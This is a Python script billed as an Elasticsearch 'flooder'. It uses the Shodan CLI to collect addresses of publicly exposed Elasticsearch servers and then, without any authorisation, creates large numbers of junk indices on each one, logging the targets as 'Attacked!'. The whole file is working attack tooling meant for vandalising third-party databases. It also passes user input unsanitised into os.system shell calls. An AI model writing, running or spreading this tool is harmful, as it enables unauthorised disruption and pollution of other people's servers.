from elasticsearch import Elasticsearch
from colorama import Fore, Back, Style
from colorama import init
import string
from random import *
import sys
import os

banner = Fore.CYAN + """
             ..,,;;;;;;,,,,
       .,;'';;,..,;;;,,,,,.''';;,..
    ,,''                    '';;;;,;''
   ;'    ,;@@;'  ,@@;, @@, ';;;@@;,;';.
  ''  ,;@@@@@'  ;@@@@; ''    ;;@@@@@;;;;
     ;;@@@@@;    '''     .,,;;;@@@@@@@;;;
    ;;@@@@@@;           , ';;;@@@@@@@@;;;.
     '';@@@@@,.  ,   .   ',;;;@@@@@@;;;;;;
        .   '';;;;;;;;;,;;;;@@@@@;;' ,.:;'
          ''..,,     ''''    '  .,;'
               ''''''::''''''''


Simple elasticsearch flooder by github.com/fuckwbored
"""

init(autoreset=True)

def shodankey():
	print("What shodan key do you want to set???")
	key = input("> ")
	os.system(f"shodan init {key}")

def shodandump():
	print("How much results should i dump?")
	numb = input("> ")
	print("\nEnter file name (without extension)")
	filee = input("> ")
	filename = filee + ".json.gz"
	print('\nEnter your search query (port:"9200" all:"elastic indices") for deafult')
	query = input("> ")
	os.system(f"shodan download --limit {numb} {filename} {query}")
	print("\nEnter file where normilized result will be saved (ex. servers.txt)")
	normalized_file = input("> ")
	os.system(f"shodan parse --fields ip_str,port --separator : {filename} > {normalized_file}")
	print(Fore.GREEN + "Done! " + Fore.WHITE + "Results in " + normalized_file)

def argsmsg():
	print("All arguments:")
	print("--shodan_key - set your shodan key")
	print("--shodan_dump - dump servers with shodan")
	print("\n\nMain usage:")
	print("ex of usage: python main.py servers.txt result.txt 25")
	print("\nservers.txt - file where list of servers located(ip:port format)")
	print("result.txt - file, where script will write already flooded servers")
	print("25 - number of indexes per 1 cycle")

def main():
	text_file = open(sys.argv[1], "r")
	result_file = open(sys.argv[2], "a")
	print(banner)
	print("list of words (ex: word1 word2 word3 ...)")
	get_names = input('>>> ')
	names = get_names.split()
	for i in text_file.readlines():
		global server
		server = f"http://{i}"
		elastic = Elasticsearch(server)
		for name in names:
			try:
				for i in range(int(sys.argv[3])):
					password =  "".join(choice(string.ascii_letters +  string.digits) for x in range(randint(4,6)))
					namka = name + "_" + password.lower()
					elastic.indices.create(index=namka, ignore=400)
					print(f"{Fore.WHITE}[{Fore.GREEN}200{Style.RESET_ALL}]Index {namka} created on {server}")
				result_file.write(server)
				print("Attacked! Preparing next =)")
			except:
				print(f"{Fore.WHITE}[{Fore.RED}404{Fore.WHITE}]{Style.RESET_ALL}{Fore.CYAN}Maybe server is not accessible {server}")
				result_file.write(server)

# Body of programm
try:
	if sys.argv[1] == "--help":
		argsmsg()
	elif sys.argv[1] == "--shodan_key":
		shodankey()
	elif sys.argv[1] == "--shodan_dump":
		shodandump()
	else:
		main()
except KeyboardInterrupt:
	print("\n\nExiting...")
except:
	print("use --help for usage")